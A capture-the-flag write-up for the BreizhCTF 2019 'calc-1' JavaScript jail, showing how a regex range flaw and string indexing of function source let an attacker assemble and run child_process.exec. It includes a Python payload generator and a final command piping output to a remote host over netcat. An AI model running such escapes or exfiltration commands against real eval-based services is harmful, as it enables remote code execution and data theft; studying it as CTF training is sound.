---
title: BreizhCTF 2019 - calc-1
authors: dabi0ne
layout: writeup
ctf_url: https://www.breizhctf.com/
---
Solves: 2 / Points: ?? / Category: Jail

## Challenge description 
I've made a simple calculator in JS, I know I shouldn't use eval but with only 6 chars per line I should be safe.

Note: the [source code](/assets/calc.js) of the challenge was accessible

## Challenge resolution
Our objective is to execute a shell command from the JS calculator.
To perform that we have to run the following payload on the calculator :

```javascript
require('child_process').exec("cmd")
```


### Step one : bypass 6 chars limitation

The calc limits input size to 6 chars :
```js
createFilter(line => line.length < 7, "Input too long, max 6 char per line."), // check line length
```

Problem : Simple and good control -> no bypass :(

Solution : 

The calc program use the regexp  "^([0123456789*\/+%-_ 	])+$" to validate inputs.

The interesting point here is the position of the operator "-" which define an interval on a RegExp context when it's not escaped.
Thus, all the characters between the "%" and "_",   A to Z included but not a to z.

So we can create a variable an store data :
```js
> A='E'
E
> A
E
```

Therefore, we are able to build a payload of more than 6 characters.

Unfortunately JavaScript is a case-sensitive language, so we can not write our exploit directly.

### Step two : Lowercase alphabet construction

From JavaScript doc :
"+ is also used as the string concatenation operator: If any of its arguments is a string or is otherwise not a number, any non-string arguments are converted to strings, and the 2 strings are concatenated."

We have a fully upercase function name : EVAL
```
> EVAL
[Function: EVAL]
```

So by applying the operator "+" to the EVAL function we could obtain some lowercase chars :)

```
> EVAL+1
function (src){
    const cmd = `_=${src}`
    eval(cmd)
    return _
}1
> _[10]
s
```

However, the content of the above response doesn't allow us to write the desired payload. We need to retrieve more chars.

We tried with the main function :
```javascript
A=EVAL
A+1
_[53] // m
E=_
A+1
_[49] // a
E+_
E=_
A+1
_[5] // i
E+_
E=_
A+1
_[7] // n
E+_
E=_
A(E) // EVAL("main")
_+1  // show main's code
```
Output : 
```javascript
function main(){
    console.log("   _________________________________   ")
    console.log("  |                                 |  ")
    console.log("  |   Welcome to our js calculator  |  ")
.
.
.
}1;
```
Nice, we have more chars here !

### Step two(bis) : Lowercase alphabet py-construction
To write the complete payload we had to automate the steps above.
The following python  script is the result of the automation process :
```python
# EVAL source code
a = """function (src){
    const cmd = `_=${src}`
    eval(cmd)
    return _
}1
"""
# main source code
b = """function main(){
    console.log("   _________________________________   ")
    console.log("  |                                 |  ")
    console.log("  |   Welcome to our js calculator  |  ")
    console.log("  |      Submit your expression     |  ")
    console.log("  |     Only 6 char per line max    |  ")
    console.log("  |_________________________________|\n")


    function createFilter(func, error_msg){
        return function(callback, onerror) {
            return line => func(line) ? callback(line) : onerror(error_msg)
        }
    }

    function createModifier(func){
        return function(callback, onerror) {
            return line => callback(func(line))
        }
    }

    function applyFunction(func){
        return function(callback, onerror) {
            return line => (func(line), callback(line))
        }
    }


    const whiteList = [
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", // digits
        "*", "/", "+", "%", "-",  // operators
        "_", " ", "\t" // output and white space
    ]

    const validCodeReg = new RegExp(`^([${whiteList.join("")}])+$`)

    const handlers = [
        createFilter(line => line.length < 7, "Input too long, max 6 char per line."), // check line length
        createFilter(line => validCodeReg.exec(line), `Invalid char in input, only valid chars are "${whiteList.join("")}".`), // check line against whitelist
        createModifier(line => EVAL(line)), // evaluate line
        applyFunction(console.log), // print output
    ]
    const handler = handlers.reverse()
          .reduce(
              (prev, cur) => cur(prev, error_msg => (console.error(error_msg), true)),
              _ => false
          )

    startPrompt(handler, true)
}1
"""
upcase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"

get_lowercase_chars =  """ 
A=EVAL
A+1
_[53]
E=_
A+1
_[49]
E+_
E=_
A+1
_[5]
E+_
E=_
A+1
_[7]
E+_
E=_
A(E)
_+1
M=_
E=''
A+1
_[4]
E+_
E=_
M+1
_[286]
E+_
E=_
A+1
_[5]
E+_
E=_
A+1
_[10]
E+_
E=_
A(E)
T=_
E=''""" # we have to clean the E var

get_lowercase_chars_no_clean =  """
A=EVAL
A+1
_[53]
E=_
A+1
_[49]
E+_
E=_
A+1
_[5]
E+_
E=_
A+1
_[7]
E+_
E=_
A(E)
_+1
M=_
E=''
A+1
_[4]
E+_
E=_
M+1
_[286]
E+_
E=_
A+1
_[5]
E+_
E=_
A+1
_[10]
E+_
E=_
A(E)
T=_
""" # E contains "this" and we don't clean it here

# code to obtain EVAL and main functions code
print get_lowercase_chars

def generate(string, source, name, source2, name2):
    
    result = ""
    for c in string:

        found = False
        if c == "q":
            print get_lowercase_chars_no_clean
            getQ()
            result += c
            print "E+U"
            print "E=_"
            continue
        if c in upcase:
            result += c
            print "E+'" + str(c) + "'"
            print "E=_"
            continue
        j = 0
        for i in source:
            if i == c:
                found = True
                result += c
                print name + "+1"
                print "_[" + str(j) + "]"
                print "E+_"
                print "E=_"
                break
            j+=1

        if found == False:
            j = 0
            for i in source2:
                if i == c:
                    found = True
                    result += c
                    print name2 + "+1"
                    print "_[" + str(j) + "]"
                    print "E+_"
                    print "E=_"
                    break
                j += 1


def getQ():

    print "X=E"
    generate("process", a, "A", b, "M")
    print "P=_"
    print "E=''"
    generate("moduleLoadList", a, "A", b, "M")
    print "K=E"
    print "T[P]"
    print "Q=_"
    print "Q[K]"
    print "H=_"
    print "H[47]"
    print "N=_"
    print "N[22]"
    print "Q=_"
```

The getQ function generate the instructions to obtain the letter "q" because there are no "q" on main or EVAL code.

Finally, we wrote the generation of the payload :

```python
# payload generation
generate("re", a, "A", b, "M")
print "R=_"
print "E=''"
getQ()
print "E=''"
generate("uire", a, "A", b, "M")
print "U=_"
print "E=''"
generate("child_process", a, "A", b, "M")
print "R+Q"
print "R=_"
print "R+U"
print "R=_"
print "A(R)"
print "_(E)"
print "F=_" 
print "E=''"
generate("exec", a, "A", b, "M")
print "F[E]"
print "F=_"
print "E=''"

generate("/home/guest/flag_reader | nc myhostname 443", a, "A", b, "M")
```

Once the output of the python generator executed on the JS calculator we had the following vars :

```js
> F
[Function: exec]
> E
/home/guest/flag_reader | nc myhostname 443
```

Run the exec function F with the parameter E and get the flag :
```js
> F(E)
```

```sh
root@myhostname# nc -lp 443

breizhctf_flag{FORGOTTEN_FLAG}

```

